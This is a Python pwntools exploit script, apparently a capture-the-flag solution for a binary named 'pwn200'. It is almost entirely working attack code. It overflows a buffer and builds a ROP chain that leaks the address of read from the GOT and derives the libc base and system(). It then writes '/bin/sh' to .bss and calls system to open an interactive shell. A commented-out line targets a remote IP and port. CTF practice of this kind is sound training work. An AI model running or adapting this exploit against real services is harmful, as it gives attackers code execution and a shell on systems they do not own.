from pwn import *

#context.log_level = 'debug'
#io = remote('218.2.197.235', 10101)
io = process('./pwn200')
e = ELF('./pwn200')
libc = e.libc
#libc = ELF('./libc.so')
#gdb.attach(io, 'b* 0x08048596')
io.recv(0xC)

buf = 'syclover\x00'
buf = buf.ljust(17,'\xff')
io.send(buf)
io.recv(0xe)

rop = ROP(e)
rop.write(1,e.got['read'],4)
rop.read(0, e.bss(0x80), 8)
rop.call(0x080485C2)

payload = '\x00'*160
payload += str(rop)
io.sendline(payload)
buf = io.recv(4)
read_addr= u32(buf)
log.success('read:'+hex(read_addr))

libc_base = read_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']
log.success('read:'+ hex(read_addr))
#system_addr = int(raw_input('system:'), 16)
log.success('system:'+ hex(system_addr))

io.send('/bin/sh\x00')

io.recv(0xC)
buf = 'syclover\x00'
buf = buf.ljust(17,'\xff')
io.send(buf)
io.recv(0xe)

#gdb.attach(io, 'b* q0x080485B8 ')
rop = ROP(e)
rop.call(system_addr, [e.bss(0x80)])

payload = '\x00'*160
payload += str(rop)
io.sendline(payload)
io.interactive()

libc